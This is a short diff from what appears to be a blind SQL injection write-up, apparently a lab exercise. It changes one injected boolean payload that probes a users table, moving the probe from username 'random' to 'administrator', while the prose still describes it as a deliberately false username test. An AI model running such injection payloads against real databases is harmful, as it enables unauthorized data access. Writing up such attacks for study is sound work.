@@ -125,7 +125,7 @@ With the `users` table confirmed, the next step was verifying the `administrator
 To validate the oracle's negative response with equal confidence, a deliberately false username was tested:
 
 ```sql
-' AND (SELECT 'username' FROM users WHERE username='random')='random'--
+' AND (SELECT 'username' FROM users WHERE username='administrator')='random'--
 ```
 
 
